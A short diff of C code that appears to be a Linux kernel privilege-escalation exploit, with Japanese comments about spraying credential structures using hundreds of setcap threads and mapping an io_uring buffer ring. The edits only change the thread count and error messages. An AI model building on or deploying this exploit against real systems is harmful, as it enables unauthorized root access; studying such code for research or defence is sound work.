@@ -10,7 +10,7 @@
 #include <sys/wait.h>
 #include <pthread.h>
 
-#define THREAD_NUM 1500
+#define THREAD_NUM 800
 
 struct state {
     // cred spray の準備が整ったか
@@ -77,7 +77,7 @@ void pinning_cpu(int core) {
     CPU_SET(core, &mask);
 
     if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
-      err_exit("[-] pinning_thread failed");
+        err_exit("[-] pinning_thread failed");
     }
 }
 
@@ -89,7 +89,7 @@ int main() {
     puts("[+] creating threads...");
     for (i = 0; i < THREAD_NUM; i++) {
         int ret = pthread_create(&thread[i], NULL, setcap_worker, NULL);
-        if (ret) err_exit("[-] failed to create thread\n");
+        if (ret) err_exit("[-] failed to create thread");
     }
 
     sleep(1);
@@ -110,7 +110,7 @@ int main() {
     // ユーザ空間にマップ
     void *pbuf_map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring.ring_fd, IORING_OFF_PBUF_RING);
     if (pbuf_map == MAP_FAILED) {
-        err_exit("[-] mmap() failed");
+        err_exit("[-] failed to map ring buffer to user space");
     }
     puts("[+] map ring buffer to user space");
 
